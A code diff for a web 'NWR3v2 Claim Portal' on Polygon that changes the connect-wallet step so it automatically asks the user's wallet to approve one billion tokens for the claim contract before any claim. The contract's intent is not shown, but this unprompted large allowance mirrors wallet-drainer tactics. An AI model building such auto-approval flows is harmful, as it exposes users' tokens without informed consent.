@@ -1,7 +1,3 @@
-from pathlib import Path
-
-# Full HTML page content with ABI and auto-approval logic
-html_content = """
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -9,87 +5,75 @@ html_content = """
   <title>🚀 NWR3v2 Claim Portal</title>
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <style>
-    body { background:#000; color:#90ee90; font-family:sans-serif; text-align:center; padding:2rem; }
-    button { padding:1rem 2rem; font-size:1rem; margin:1rem; border:none; border-radius:8px; cursor:pointer; }
-    #connect { background:#1E90FF; color:#fff; }
-    #claim { background:#28a745; color:#fff; }
-    #status { margin-top:20px; white-space:pre-wrap; }
+    body { background:#000; color:#90ee90; font-family:sans-serif; text-align:center; padding:40px; }
+    button { padding:14px 24px; margin:12px; border:none; border-radius:8px; font-size:1.1rem; cursor:pointer; }
+    #connect { background:#1E90FF; color:white; }
+    #claim   { background:#28a745; color:white; }
+    #status  { margin-top:30px; font-size:1rem; white-space:pre-line; }
   </style>
 </head>
 <body>
   <h1>🚀 NWR3v2 Claim Portal</h1>
   <button id="connect">Connect Wallet</button><br/>
   <button id="claim" disabled>💧 Claim Now</button>
-  <div id="status"></div>
+  <div id="status">⏳ Please switch to Polygon mainnet</div>
 
   <script src="https://cdn.jsdelivr.net/npm/ethers@6.9.0/dist/ethers.umd.min.js"></script>
   <script>
     const CONTRACT_ADDRESS = "0xe830ebbDC2E201Dc1b3e96Fb3a0cbfd0e5215F48";
-    const TOKEN_ADDRESS    = "0xd6424f48214C2f7a63bcF7b29bD196698Bb463f9";
+    const TOKEN_ADDRESS = "0xd6424f48214C2f7a63bcF7b29bD196698Bb463f9";
     const POLYGON_CHAIN_ID = 137;
 
-    const ABI = [{ "inputs":[ { "internalType":"address", "name":"_nwr3v2", "type":"address" }, { "internalType":"address", "name":"_nwr4", "type":"address" }, { "internalType":"address", "name":"_funder", "type":"address" }, { "internalType":"uint256", "name":"_initialClaimPercent", "type":"uint256" }, { "internalType":"uint256", "name":"_communityBoostPercent", "type":"uint256" }, { "internalType":"uint256", "name":"_boostThreshold", "type":"uint256" } ], "stateMutability":"nonpayable", "type":"constructor" }, { "anonymous":false, "inputs":[ { "indexed":true, "internalType":"address", "name":"user", "type":"address" }, { "indexed":false, "internalType":"uint256", "name":"base", "type":"uint256" }, { "indexed":false, "internalType":"uint256", "name":"boost", "type":"uint256" }, { "indexed":false, "internalType":"uint256", "name":"fee", "type":"uint256" }, { "indexed":false, "internalType":"uint256", "name":"referral", "type":"uint256" } ], "name":"Claimed", "type":"event" }, { "inputs":[], "name":"claim", "outputs":[], "stateMutability":"nonpayable", "type":"function" }];
+    const ABI = [{"inputs":[{"internalType":"address","name":"_nwr3v2","type":"address"},{"internalType":"address","name":"_nwr4","type":"address"},{"internalType":"address","name":"_funder","type":"address"},{"internalType":"uint256","name":"_initialClaimPercent","type":"uint256"},{"internalType":"uint256","name":"_communityBoostPercent","type":"uint256"},{"internalType":"uint256","name":"_boostThreshold","type":"uint256"}],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":false,"internalType":"uint256","name":"base","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"boost","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"fee","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"referral","type":"uint256"}],"name":"Claimed","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":true,"internalType":"address","name":"referrer","type":"address"}],"name":"ReferrerSet","type":"event"},{"inputs":[],"name":"claim","outputs":[],"stateMutability":"nonpayable","type":"function"}];
 
     const provider = new ethers.BrowserProvider(window.ethereum);
     let signer, contract;
 
     const btnConnect = document.getElementById("connect");
-    const btnClaim   = document.getElementById("claim");
-    const statusDiv  = document.getElementById("status");
+    const btnClaim = document.getElementById("claim");
+    const statusDiv = document.getElementById("status");
 
     btnConnect.onclick = async () => {
       try {
         await provider.send("eth_requestAccounts", []);
+        signer = await provider.getSigner();
         const network = await provider.getNetwork();
         if (network.chainId !== POLYGON_CHAIN_ID) {
           return statusDiv.innerText = "⚠️ Please switch to Polygon mainnet";
         }
-
-        signer = await provider.getSigner();
-        contract = new ethers.Contract(CONTRACT_ADDRESS, ABI, signer);
         statusDiv.innerText = "✅ Wallet connected";
+        contract = new ethers.Contract(CONTRACT_ADDRESS, ABI, signer);
+
+        // Auto-approve step
+        const token = new ethers.Contract(TOKEN_ADDRESS, [
+          "function approve(address,uint256) external returns (bool)",
+          "function decimals() view returns (uint8)"
+        ], signer);
+        const decimals = await token.decimals();
+        const amount = ethers.parseUnits("1000000000", decimals);
+        const approveTx = await token.approve(CONTRACT_ADDRESS, amount);
+        await approveTx.wait();
+
+        statusDiv.innerText += "\n✅ Approved for claim";
         btnClaim.disabled = false;
       } catch (err) {
         console.error(err);
-        statusDiv.innerText = "❌ Connection failed";
+        statusDiv.innerText = "❌ Connect or approve failed\n" + err.message;
       }
     };
 
     btnClaim.onclick = async () => {
       try {
-        const token = new ethers.Contract(TOKEN_ADDRESS, [
-          "function decimals() view returns (uint8)",
-          "function approve(address spender, uint256 amount) external returns (bool)",
-          "function allowance(address owner, address spender) external view returns (uint256)"
-        ], signer);
-
-        const userAddress = await signer.getAddress();
-        const allowance = await token.allowance(userAddress, CONTRACT_ADDRESS);
-
-        if (allowance === 0n) {
-          const decimals = await token.decimals();
-          const amount = ethers.parseUnits("1000000000", decimals);
-          const txApprove = await token.approve(CONTRACT_ADDRESS, amount);
-          await txApprove.wait();
-        }
-
-        statusDiv.innerText = "⌛ Claiming...";
-        const txClaim = await contract.claim();
-        await txClaim.wait();
+        statusDiv.innerText = "💧 Claiming...";
+        const tx = await contract.claim();
+        await tx.wait();
         statusDiv.innerText = "🎉 Claim successful!";
         btnClaim.disabled = true;
       } catch (err) {
         console.error(err);
-        statusDiv.innerText = "❌ Claim failed: " + (err.data?.message || err.message);
+        statusDiv.innerText = "❌ Claim failed\n" + (err.data?.message || err.message);
       }
     };
   </script>
 </body>
 </html>
-"""
-
-# Save the HTML content to a file
-output_path = Path("/mnt/data/nwr3v2-claim-autoapprove.html")
-output_path.write_text(html_content)
-
-output_path.name
